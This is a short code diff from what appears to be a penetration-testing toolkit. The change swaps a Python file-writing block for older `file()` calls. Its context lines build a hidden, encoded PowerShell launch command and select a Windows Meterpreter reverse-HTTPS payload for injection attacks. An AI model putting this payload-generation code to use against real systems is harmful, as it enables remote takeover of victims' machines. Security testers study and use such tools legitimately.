@@ -87,8 +87,10 @@ try:
         x86 = fileopen.read()
     x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
     core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
-    with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
-        filewrite.write(x86)
+    filewrite = file(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
+    #with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
+    filewrite.write(x86)
+    filewrite.close()
     payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
     command = x86  # assign powershell to command
 
